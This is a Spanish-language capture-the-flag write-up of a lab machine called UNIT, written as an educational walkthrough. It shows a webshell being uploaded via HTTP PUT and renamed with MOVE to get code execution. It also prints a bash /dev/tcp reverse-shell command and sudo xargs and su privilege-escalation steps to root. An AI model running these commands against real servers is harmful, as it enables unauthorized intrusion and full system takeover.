---
title: "[ES] Writeup de la maquina UNIT"
date: 2025-01-29T00:00:00+00:00
tags: ["hacking","spanish","cybersec","classnotes","writeups"]
author: "XoanOuteiro"
showToc: true
TocOpen: false
draft: false
description: "Writeup de la maquina UNIT"
---

>Resolucion: Se trata de una maquina basada en una vulnerabilidad de RFI a RCE PHP mediante los metodos PUT y MOVE de HTTP

---

Iniciamos con un ping sweep para descubrir la maquina.

``` java
sudo nmap -sn 192.168.56.0/24
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-28 19:33 CET
Nmap scan report for 192.168.56.1
Host is up (0.00028s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.10
Host is up (0.00031s latency).
MAC Address: 08:00:27:A4:04:70 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.102
Host is up (0.00079s latency).
MAC Address: 08:00:27:7B:8B:9E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.104
Host is up (0.00079s latency).
MAC Address: 08:00:27:6B:C7:57 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.100
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.08 seconds
```

Realizamos un ping por visibilidad:

``` java
ping -c 1 192.168.56.104
PING 192.168.56.104 (192.168.56.104) 56(84) bytes of data.
64 bytes from 192.168.56.104: icmp_seq=1 ttl=64 time=0.560 ms

--- 192.168.56.104 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.560/0.560/0.560/0.000 ms
```

El ttl de 64 sugiere que se trata de un sistema Linux, lancemos una enumeracion nmap completa:

``` bash
sudo nmap -sS -sC -sV -O -p- -T5 192.168.56.104 -oN nmap.txt
```

La salida:

``` java
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-28 19:36 CET
Nmap scan report for 192.168.56.104
Host is up (0.00070s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp   open  http    nginx 1.22.1
|_http-title: 415 Unsupported Media Type
|_http-server-header: nginx/1.22.1
8080/tcp open  http    nginx 1.22.1
| http-methods: 
|_  Potentially risky methods: PUT MOVE
|_http-server-header: nginx/1.22.1
|_http-title: 415 Unsupported Media Type
MAC Address: 08:00:27:6B:C7:57 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.28 seconds
                                                               
```

Tenemos dos servicios http y uno de ssh. Podemos tambien ver que el servicio HTTP de 8080 permite PUT y MOVE. Podemos iniciar nuestro proceso de explotacion aqui, enumeremos este servicio.

---

Tenemos la info de que se trata de nginx 1.22.1, que no parece ser vulnerable a nada segun searchsploit.

Intento averiguar mas detalles, pero whatweb solo devuelve esto:

``` java
whatweb 192.168.56.104:8080
http://192.168.56.104:8080 [415 Unsupported Media Type] Country[RESERVED][ZZ], HTTPServer[nginx/1.22.1], IP[192.168.56.104], Title[415 Unsupported Media Type], nginx[1.22.1]

```

Este codigo de error corresponde a una respuesta a una llamada de PUT, esto seguramente se deba a que no permita POST o GET y por lo tanto interprete nuestras peticiones como intentos de subida de archivos, probemos a subir un fichero .txt.

Creamos un archivo y lo subimos mediante PUT con el comando:

``` bash
curl -X PUT -T "file.txt" "http://192.168.56.104:8080/file.txt"
```

Y podemos verlo desde el navegador.

Quizas podriamos subir un archivo PHP, de momento sabemos que podemos subir archivos TXT.

Utilizando la simple-backdoor de /usr/share/webshells no podemos:

``` bash
cp /usr/share/webshells/simple-backdoor.php back.php
curl -X PUT -T "back.php" "http://192.168.56.104:8080/back.php"
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.22.1</center>
</body>
</html>
```

Pero podemos subirlo en txt.
Logro subirlo con:

``` bash
mv back.php back.txt
curl -X PUT -T "back.txt" "http://192.168.56.104:8080/back.txt"
```

Pero el contenido TXT no se renderiza, pero quizas pueda utilizar move para cambiarlo a php:

``` bash
curl -X MOVE -H "Destination: http://192.168.56.104:8080/back.php" http://192.168.56.104:8080/back.txt
   
```

Y funciona, tenemos RCE desde el parametro cmd, podemos realizar una peticion a:

```
http://192.168.56.104:8080/back.php?cmd=ls;whoami;
```

Y obtenemos:

```
back.php
file.txt
index.html
www-data
```

Pero esto no nos sirve, no fui capaz de estabecer una shell con la URL:

```
http://192.168.56.104:8080/back.php?cmd=bash -i >& /dev/tcp/192.168.56.100/4444 0>&1
```

Asi que probare a subir una reverse shell de PHP directamente, siguiendo la secuencia de subirlo como TXT y utilizar move para transformarlo en un archivo php.

Y con la reverse shell de PHP clasica estamos dentro:

```
 nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.56.100] from (UNKNOWN) [192.168.56.104] 58644
Linux unit 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64 GNU/Linux
 19:59:43 up 27 min,  0 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Ahora en cuanto a la escalada de privilegios, veamos:

``` bash
$ sudo -l
Matching Defaults entries for www-data on unit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on unit:
    (jones) NOPASSWD: /usr/bin/xargs
```

Podemos utilizar xargs con los permisos de un tal usuario jones, segun gtfobins tenemos permisos de escritura, con lo que sacamos la flag de usuario:

``` bash
$ sudo -u jones xargs -a "/home/jones/user.txt" -0
[censurado para evitar trampas]
```

Pero tambien podemos abusar de los permisos para obtener una sh con jones:

``` bash
$ sudo -u jones xargs -a /dev/null sh
whoami
jones
```

Ahora veamos los permisos de jones:

``` bash
sudo -l
Matching Defaults entries for jones on unit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User jones may run the following commands on unit:
    (root) NOPASSWD: /usr/bin/su

sudo su
whoami
root
```

Simplemente no permite cambiar a sesion de root

Y ya esta, somos root.

Flag de root:

``` bash
cat /root/root.txt
[censurado para evitar trampas]
```


